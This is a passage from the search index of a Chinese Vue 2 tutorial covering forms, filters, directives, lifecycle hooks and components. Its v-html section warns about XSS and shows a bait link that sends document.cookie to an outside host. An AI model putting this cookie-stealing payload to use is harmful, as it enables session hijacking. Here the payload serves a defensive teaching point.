联合使用，在表单中有提交或按钮，立马触发后面紧跟的方法\",\".prevent：表示阻止默认事件的修饰符，提交以后不会刷新页面。阻止默认事件就是指有些标签本身会存在事件，如 a 标签的跳转，form 表单中的 submit 按钮的提交事件等，某些时候想执行自己设置的事件，这个时候就需要阻止标签的默认事件的执行。在 Vue 中，只需要使用 .prevent 修饰符就可以\",\"注：.prevent 不一定非要跟 submit 绑定在一起\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>收集表单数据</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <form @submit.prevent=\\\"test\\\"> 账号：<input type=\\\"text\\\" v-model.trim=\\\"userInfo.account\\\" /><br /> 密码：<input type=\\\"password\\\" v-model=\\\"userInfo.passWord\\\" /><br /> 年龄：<input type=\\\"number\\\" v-model.number=\\\"userInfo.age\\\" /><br /> 性别：<br /> 男<input type=\\\"radio\\\" v-model=\\\"userInfo.sex\\\" value=\\\"male\\\" /> 女<input type=\\\"radio\\\" v-model=\\\"userInfo.sex\\\" value=\\\"female\\\" /><br /> 爱好：<br /> 学习<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"study\\\" /> 打游戏<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"game\\\" /> 吃饭<input type=\\\"checkbox\\\" v-model=\\\"userInfo.hobby\\\" value=\\\"eat\\\" /> <br /> 所属校区: <br /> <select v-model=\\\"userInfo.area\\\"> <option value=\\\"\\\">请选择校区</option> <option value=\\\"QuFuL\\\">曲阜老校区</option> <option value=\\\"QuFuX\\\">曲阜新校区</option> <option value=\\\"RiZhao\\\">日照校区</option> </select> <br /> 其他信息：<br /> <textarea v-model.lazy=\\\"userInfo.other\\\"></textarea> <br /> <input type=\\\"checkbox\\\" v-model=\\\"userInfo.agree\\\" />阅读并接受 <a href=\\\"https://www.qfnu.edu.cn\\\">《用户协议》</a> <br /> <button>提交</button> </form> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { userInfo: { account: '', passWord: '', age: 18, sex: 'female', hobby: [], area: '', other: '', agree: '', }, }, methods: { test() { console.log(JSON.stringify(this.userInfo)) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-收集表单数据01.png\"]}]},\"/front-end/vue-notes/11-Vue%E6%A0%B8%E5%BF%83-%E8%BF%87%E6%BB%A4%E5%99%A8.html\":{\"title\":\"过滤器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/11-Vue核心-过滤器\",\"定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）\",\"注册过滤器：\",\"Vue.filter(name, callback) 全局过滤器\",\"new Vue {filters: {}} 局部过滤器\",\"使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = \\\"xxx | 过滤器名\\\"\",\"备注：\",\"过滤器可以接收额外参数，多个过滤器也可以串联\",\"并没有改变原本的数据，而是产生新的对应的数据\",\"处理时间的库：moment 体积较大，dayjs 轻量级\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>过滤器</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <!-- //引入dayjs库 --> <script src=\\\"https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>时间</h2> <h3>当前时间戳：{{time}}</h3> <h3>转换后的时间：{{time|timeFilter()}}</h3> <h3>转换后的时间：{{time|timeFilter('YYYY-MM-DD HH:mm:ss')}}</h3> <h3>截取年月日：{{time|timeFilter() | mySlice}}</h3> </div> <script> Vue.config.productionTip = false //全局过滤器 Vue.filter('mySlice', function (value) { return value.slice(0, 11) }) new Vue({ el: '#root', data: { time: 1683621034195, }, //局部过滤器 filters: { timeFilter(value, str = 'YYYY年MM月DD日HH:mm:ss') { return dayjs(value).format(str) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-过滤器01.png\"]}]},\"/front-end/vue-notes/12-Vue%E6%A0%B8%E5%BF%83-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4%E4%B8%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4.html\":{\"title\":\"内置指令与自定义指令\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/12-Vue核心-内置指令与自定义指令\"]},{\"header\":\"1. 内置指令\",\"slug\":\"_1-内置指令\",\"contents\":[]},{\"header\":\"1.1 常用的内置指令\",\"slug\":\"_1-1-常用的内置指令\",\"contents\":[\"v-bind 单向绑定解析表达式，可简写为 :\",\"v-model 双向数据绑定\",\"v-for 遍历数组 / 对象 / 字符串\",\"v-on 绑定事件监听，可简写为 @\",\"v-show 条件渲染 (动态控制节点是否展示)\",\"v-if 条件渲染（动态控制节点是否存在）\",\"v-else-if 条件渲染（动态控制节点是否存在）\",\"v-else 条件渲染（动态控制节点是否存在）\"]},{\"header\":\"1.2 v-text指令\",\"slug\":\"_1-2-v-text指令\",\"contents\":[\"v-text 指令\",\"作用：向其所在的节点中渲染文本内容\",\"与插值语法的区别：v-text 会替换掉节点中的内容，{{xxx}} 则不会，更灵活\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-text指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <div>你好，{{name}}</div> <div v-text=\\\"name\\\"></div> <div v-text=\\\"str\\\"></div> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', str: '<h3>你好呀！</h3>', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令01.png\"]},{\"header\":\"1.3 v-html指令\",\"slug\":\"_1-3-v-html指令\",\"contents\":[\"作用：向指定节点中渲染包含 html 结构的内容\",\"与插值语法的区别：\",\"v-html 会替换掉节点中所有的内容，{{xxx}} 则不会\",\"v-html 可以识别 html 结构\",\"严重注意 v-html 有安全性问题！！！\",\"在网站上动态渲染任意 html 是非常危险的，容易导致 XSS 攻击\",\"一定要在可信的内容上使用 v-html，永远不要用在用户提交的内容上！！！\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-html指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <div>你好，{{name}}</div> <div v-html=\\\"str1\\\"></div> <div v-html=\\\"str2\\\"></div> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', str1: '<h3>你好呀！</h3>', str2: '<a href=javascript:location.href=\\\"http://www.baidu.com?\\\"+document.cookie>兄弟我找到你想要的资源了，快来！</a>', }, }) </script> </body> </html> \",\"我们在 cookie 中存放如下数据\",\"Vue核心-内置指令与自定义指令02.png\",\"点击案例中的链接就可以获取\",\"效果：\",\"Vue核心-内置指令与自定义指令03.gif\"]},{\"header\":\"1.4 v-cloak指令\",\"slug\":\"_1-4-v-cloak指令\",\"contents\":[\"v-cloak 指令（没有值）\",\"本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 v-cloak 属性\",\"使用 CSS 配合 v-cloak 可以解决网速慢时页面展示出 {{xxx}} 的问题\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-cloak指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> [v-cloak] { display: none; } </style> </head> <body> <div id=\\\"root\\\"> <!-- 如果网速慢则一开始不显示 --> <h2 v-cloak>{{name}}</h2> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', }, }) </script> </body> </html> \"]},{\"header\":\"1.5 v-once指令\",\"slug\":\"_1-5-v-once指令\",\"contents\":[\"v-once 所在节点在初次动态渲染后，就视为静态内容了\",\"以后数据的改变不会引起 v-once 所在结构的更新，可以用于优化性能\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-once指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-once>初始化的n值是：{{n}}</h2> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令04.gif\"]},{\"header\":\"1.6 v-pre指令\",\"slug\":\"_1-6-v-pre指令\",\"contents\":[\"跳过 v-pre 所在节点的编译过程\",\"可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>v-pre指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-pre>Vue其实很简单</h2> <h2>当前的n值是:{{n}}</h2> <button @click=\\\"n++\\\">点我n+1</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令05.gif\"]},{\"header\":\"2. 自定义指令\",\"slug\":\"_2-自定义指令\",\"contents\":[\"directives\"]},{\"header\":\"2.1 定义语法\",\"slug\":\"_2-1-定义语法\",\"contents\":[]},{\"header\":\"2.1.1 局部指令\",\"slug\":\"_2-1-1-局部指令\",\"contents\":[\"new Vue({ directives:{ 指令名:配置对象 } }) \",\"或\",\"new Vue({ directives:{ 指令名:回调函数 } }) \",\"例：\",\"directives : { 'my-directive' : { bind (el, binding) { el.innerHTML = binding.value.toupperCase() } } } \"]},{\"header\":\"2.1.2 全局指令\",\"slug\":\"_2-1-2-全局指令\",\"contents\":[\"Vue.directive(指令名, 配置对象) \",\"或\",\"Vue.directive(指令名, 回调函数) \",\"例：\",\"Vue.directive('my-directive', function(el, binding){ el.innerHTML = binding.value.toupperCase() }) \"]},{\"header\":\"2.2 配置对象中常用的3个回调函数\",\"slug\":\"_2-2-配置对象中常用的3个回调函数\",\"contents\":[\"bind (element, binding) 指令与元素成功绑定时调用\",\"inserted (element, binding) 指令所在元素被插入页面时调用\",\"update(element, binding) 指令所在模板结构被重新解析时调用\",\"element 就是 DOM 元素，binding 就是要绑定的对象，它包含以下属性：name 、value、oldValue、expression、arg、modifiers\",\"例：\",\"Vue.directive('fbind', { // 指令与元素成功绑定时（一上来） bind(element, binding) { // element就是DOM元素，binding就是要绑定的 element.value = binding.value }, // 指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, // 指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value } }) \"]},{\"header\":\"2.3 注意\",\"slug\":\"_2-3-注意\",\"contents\":[\"指令定义时不加 v-，但使用时要加 v-\",\"指令名如果是多个单词，要使用 kebab-case 命名方式，不要用 camelCase 命名\"]},{\"header\":\"2.4 使用指令\",\"slug\":\"_2-4-使用指令\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>自定义指令</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>当前n值是：<span v-text=\\\"n\\\"></span></h2> <h2>放大10倍后的n值是：<span v-big=\\\"n\\\"></span></h2> <button @click=\\\"n++\\\">点我n+1</button> <hr /> <input type=\\\"text\\\" v-fbind:value=\\\"n\\\" /> </div> <script> Vue.config.productionTip = false //定义全局指令 /*Vue.directive('fbind', { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, })*/ new Vue({ el: '#root', data: { n: 1, }, directives: { //big函数何时会被调用？ //1.指令与元素成功绑定时（一上来） //2.指令所在的模板被重新解析时 big(element, binding) { //console.log('big', this) //注意此处的this是window element.innerText = binding.value * 10 }, fbind: { //指令与元素成功绑定时（一上来） bind(element, binding) { element.value = binding.value }, //指令所在元素被插入页面时 inserted(element, binding) { element.focus() }, //指令所在的模板被重新解析时 update(element, binding) { element.value = binding.value }, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-内置指令与自定义指令06.gif\"]}]},\"/front-end/vue-notes/13-Vue%E6%A0%B8%E5%BF%83-Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html\":{\"title\":\"Vue生命周期\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/13-Vue核心-Vue生命周期\"]},{\"header\":\"1. 引出生命周期\",\"slug\":\"_1-引出生命周期\",\"contents\":[\"生命周期：\",\"又名生命周期回调函数、生命周期函数、生命周期钩子\",\"是什么：Vue 在关键时刻帮我们调用的一些特殊名称的函数\",\"生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的\",\"生命周期函数中的 this 指向是 vm 或组件实例对象\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>引出生命周期</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 v-if=\\\"a\\\">你好啊</h2> <h2 :style=\\\"{opacity}\\\">看笔记学Vue</h2> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { a: false, opacity: 1, }, methods: {}, // Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted mounted() { console.log('mounted', this) setInterval(() => { this.opacity -= 0.01 if (this.opacity <= 0) this.opacity = 1 }, 16) }, }) // 通过外部的定时器实现（不推荐） // setInterval(() => { // vm.opacity -= 0.01 // if(vm.opacity <= 0) vm.opacity = 1 // },16) </script> </body> </html> \",\"效果：\",\"Vue核心-Vue生命周期01.gif\"]},{\"header\":\"2. 分析生命周期\",\"slug\":\"_2-分析生命周期\",\"contents\":[\"初始化显示 \",\"beforeCreate()\",\"created()\",\"beforeMount()\",\"mounted()\",\"更新状态 \",\"beforeUpdate()\",\"updated()\",\"销毁 Vue 实例：vm.$destory()\",\"beforeDestory()\",\"destoryed()\",\"Vue核心-Vue生命周期02.png\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>分析生命周期</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\" :x=\\\"n\\\"> <h2>当前的n值是：{{n}}</h2> <button @click=\\\"add\\\">点我n+1</button> <button @click=\\\"bye\\\">点我销毁</button> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { n: 1, }, methods: { add() { console.log('add') this.n++ }, bye() { console.log('bye') this.$destroy() }, }, watch: { n() { console.log('n变了') }, }, beforeCreate() { console.log('beforeCreate') }, created() { console.log('created') }, beforeMount() { console.log('beforeMount') }, mounted() { console.log('mounted') }, beforeUpdate() { console.log('beforeUpdate') }, updated() { console.log('updated') }, beforeDestroy() { console.log('beforeDestroy') }, destroyed() { console.log('destroyed') }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-Vue生命周期03.gif\"]},{\"header\":\"3. 总结生命周期\",\"slug\":\"_3-总结生命周期\",\"contents\":[\"常用的生命周期钩子：\",\"mounted 发送 ajax 请求、启动定时器、绑定自定义事件、订阅消息等初始化操作\",\"beforeDestroy 清除定时器、解绑自定义事件、取消订阅消息等收尾工作\",\"关于销毁 Vue 实例：\",\"销毁后借助 Vue 开发者工具看不到任何信息\",\"销毁后自定义事件会失效，但原生 DOM 事件依然有效\",\"一般不会在 beforeDestroy 操作数据，因为即便操作数据，也不会再触发更新流程了\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>总结生命周期</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2 :style=\\\"{opacity}\\\">欢迎学习Vue</h2> <button @click=\\\"opacity = 1\\\">透明度设置为1</button> <button @click=\\\"stop\\\">点我停止变换</button> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { opacity: 1, }, methods: { stop() { this.$destroy() }, }, // Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted mounted() { console.log('mounted', this) this.timer = setInterval(() => { console.log('setInterval') this.opacity -= 0.01 if (this.opacity <= 0) this.opacity = 1 }, 16) }, beforeDestroy() { clearInterval(this.timer) console.log('vm即将驾鹤西游了') }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-Vue生命周期04.gif\"]}]},\"/front-end/vue-notes/14-Vue%E6%A0%B8%E5%BF%83-Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E7%BC%96%E7%A8%8B.html\":{\"title\":\"Vue组件化编程\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/14-Vue核心-Vue组件化编程\"]},{\"header\":\"1. 模块与组件、模块化与组件化\",\"slug\":\"_1-模块与组件、模块化与组件化\",\"contents\":[\"Vue核心-Vue组件化编程01.png\",\"Vue核心-Vue组件化编程02.png\"]},{\"header\":\"1.1 模块\",\"slug\":\"_1-1-模块\",\"contents\":[\"理解：向外提供特定功能的 js 程序，一般就是一个 js 文件\",\"为什么：js 文件很多，很复杂\",\"作用：复用、简化 js 的编写，提高 js 运行效率\"]},{\"header\":\"1.2 组件\",\"slug\":\"_1-2-组件\",\"contents\":[\"定义：用来实现局部功能的代码和资源的集合（html/css/js/image…）\",\"为什么：一个界面的功能很复杂\",\"作用：复用编码，简化项目编码，提高运行效率\"]},{\"header\":\"1.3 模块化\",\"slug\":\"_1-3-模块化\",\"contents\":[\"当应用中的 js 都以模块来编写的，那这个应用就是一个模块化的应用\"]},{\"header\":\"1.4 组件化\",\"slug\":\"_1-4-组件化\",\"contents\":[\"当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用\"]},{\"header\":\"2. 非单文件组件\",\"slug\":\"_2-非单文件组件\",\"contents\":[\"非单文件组件：一个文件中包含有 n 个组件\",\"单文件组件：一个文件中只包含有 1 个组件\"]},{\"header\":\"2.1 基本使用\",\"slug\":\"_2-1-基本使用\",\"contents\":[\"Vue 中使用组件的三大步骤：\",\"定义组件 \",\"使用 Vue.extend(options) 创建，其中 options 和 new Vue(options) 时传入的 options 几乎一样，但也有点区别 \",\"el 不要写，因为最终所有的组件都要经过一个 vm 的管理，由 vm 中的 el 才决定服务哪个容器\",\"data 必须写成函数式，避免组件被复用时数据存在引用关系\",\"注册组件 \",\"局部注册：new Vue() 的时候 options 传入 components 选项\",\"全局注册：Vue.component('组件名',组件)\",\"使用组件 \",\"编写组件标签，如 <school></school>\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>基本使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <hello></hello> <hr /> <h1>{{msg}}</h1> <hr /> <!-- 第三步：编写组件标签 --> <school></school> <hr /> <!-- 第三步：编写组件标签 --> <student></student> </div> <div id=\\\"root2\\\"> <hello></hello> </div> <script> Vue.config.productionTip = false //第一步：创建school组件 const school = Vue.extend({ template: ` <div class=\\\"demo\\\"> <h2>学校名称：{{schoolName}}</h2> <h2>学校地址：{{address}}</h2> <button @click=\\\"showName\\\">点我提示学校名</button> </div> `, // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。 data() { return { schoolName: 'QFNU', address: '山东曲阜', } }, methods: { showName() { alert(this.schoolName) }, }, }) //第一步：创建student组件 const student = Vue.extend({ template: ` <div> <h2>学生姓名：{{studentName}}</h2> <h2>学生年龄：{{age}}</h2> </div> `, data() { return { studentName: '张三', age: 18, } }, }) //第一步：创建hello组件 const hello = Vue.extend({ template: ` <div> <h2>你好啊！{{name}}</h2> </div> `, data() { return { name: 'Tom', } }, }) //第二步：全局注册组件 Vue.component('hello', hello) //创建vm new Vue({ el: '#root', data: { msg: '你好啊！', }, //第二步：注册组件（局部注册） components: { school, student, }, }) new Vue({ el: '#root2', }) </script> </body> </html> \",\"效果：\",\"Vue核心-Vue组件化编程03.gif\"]},{\"header\":\"2.2 组件注意事项\",\"slug\":\"_2-2-组件注意事项\",\"contents\":[\"关于组件名：\",\"一个单词组成 \",\"第一种写法（首字母小写）：school\",\"第二种写法（首字母大写）：School\",\"多个单词组成 \",\"第一种写法（kebab-case 命名）：my-school\",\"第二种写法（CamelCase 命名）：MySchool（需要 Vue 脚手架支持）\",\"备注 \",\"组件名尽可能回避 HTML 中已有的元素名称，例如：h2、H2 都不行\",\"可以使用 name 配置项指定组件在开发者工具中呈现的名字\",\"关于组件标签：\",\"第一种写法：<school></school>\",\"第二种写法：<school/>（需要 Vue 脚手架支持）\",\"备注：不使用脚手架时，<school/> 会导致后续组件不能渲染\",\"一个简写方式：const school = Vue.extend(options) 可简写为 const school = options，因为父组件 components 引入的时候会自动创建\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>组件注意事项</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <h1>{{msg}}</h1> <school></school> </div> <script> Vue.config.productionTip = false //定义组件 const s = Vue.extend({ name: 'qfnu', template: ` <div> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> </div> `, data() { return { name: 'QFNU', address: '山东', } }, }) new Vue({ el: '#root', data: { msg: '欢迎学习Vue!', }, components: { school: s, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-Vue组件化编程04.png\"]},{\"header\":\"2.3 组件的嵌套\",\"slug\":\"_2-3-组件的嵌套\",\"contents\":[\"Vue核心-Vue组件化编程05.png\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>组件的嵌套</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"></div> <script> Vue.config.productionTip = false //定义student组件 const student = Vue.extend({ name: 'student', template: ` <div> <h2>学生姓名：{{name}}</h2> <h2>学生年龄：{{age}}</h2> </div> `, data() { return { name: 'zhf', age: 18, } }, }) //定义school组件 const school = Vue.extend({ name: 'school', template: ` <div> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <student></student> </div> `, data() { return { name: 'QFNU', address: '山东', } }, //注册组件（局部） components: { student, }, }) //定义hello组件 const hello = Vue.extend({ template: `<h1>{{msg}}</h1>`, data() { return { msg: '欢迎来到QFNU学习！', } }, }) //定义app组件 const app = Vue.extend({ template: ` <div> <hello></hello> <school></school> </div> `, components: { school, hello, }, }) //创建vm new Vue({ template: '<app></app>', el: '#root', //注册组件（局部） components: { app, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-Vue组件化编程06.png\"]},{\"header\":\"2.4 VueComponent\",\"slug\":\"_2-4-vuecomponent\",\"contents\":[\"关于 VueComponent：\",\"school 组件本质是一个名为 VueComponent 的构造函数，且不是程序员定义的，而是 Vue.extend() 生成的\",\"我们只需要写 <school/> 或 <school></school>，Vue 解析时会帮我们创建 school 组件的实例对象，即 Vue 帮我们执行的 new VueComponent(options)\",\"每次调用 Vue.extend，返回的都是一个全新的 VueComponent，即不同组件是不同的对象\",\"关于 this 指向 \",\"组件配置中 data 函数、methods 中的函数、watch 中的函数、computed 中的函数它们的 this 均是 VueComponent 实例对象\",\"new Vue(options) 配置中：data 函数、methods 中的函数、watch 中的函数、computed 中的函数它们的 this 均是 Vue 实例对象\",\"VueComponent 的实例对象，以后简称 vc（组件实例对象），Vue 的实例对象，以后简称 vm\"]},{\"header\":\"2.5 一个重要的内置关系\",\"slug\":\"_2-5-一个重要的内置关系\",\"contents\":[\"Vue核心-Vue组件化编程07.png\",\"一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype\",\"为什么要有这个关系：让组件实例对象 vc 可以访问到 Vue原型 上的属性、方法\"]},{\"header\":\"3. 单文件组件\",\"slug\":\"_3-单文件组件\",\"contents\":[]},{\"header\":\"3.1 组成\",\"slug\":\"_3-1-组成\",\"contents\":[\"模板页面：\",\"<template> 页面模板 </template> \",\"JS 模块对象：\",\"<script> export default { data() {return {}}, methods: {}, computed: {}, components: {} } </script> \",\"样式：\",\"<style> 样式定义 </style> \"]},{\"header\":\"3.2 基本使用\",\"slug\":\"_3-2-基本使用\",\"contents\":[\"引入组件\",\"映射成标签\",\"使用组件标签\",\"School.vue\",\"<template> <div id='Demo'> <h2>学校名称：{{name}}</h2> <h2>学校地址：{{address}}</h2> <button @click=\\\"showName\\\">点我提示学校名</button> </div> </template> <script> export default { name:'School', data() { return { name:'QFNU', address:'曲阜' } }, methods: { showName(){ alert(this.name) } }, } </script> <style> #Demo{ background: orange; } </style> \",\"Student.vue\",\"<template> <div> <h2>学生姓名：{{name}}</h2> <h2>学生年龄：{{age}}</h2> </div> </template> <script> export default { name:'Student', data() { return { name:'zhf', age:21 } }, } </script> \",\"App.vue\",\"<template> <div> <School></School> <Student></Student> </div> </template> <script> import School from './School.vue' import Student from './Student.vue' export default { name:'App', components:{ School, Student } } </script> \",\"main.js\",\"import App from './App.vue' new Vue({ template:`<App></App>`, el:'#root', components:{App} }) \",\"index.html\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>单文件组件</title> </head> <body> <div id=\\\"root\\\"></div> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <script src=\\\"./main.js\\\"></script> </body> </html> \",\"此时无法运行，应该使用脚手架才可以\"]},{\"header\":\"4. 组件化编码流程\",\"slug\":\"_4-组件化编码流程\",\"contents\":[\"拆分静态组件：组件要按照功能点拆分，命名不要与 html 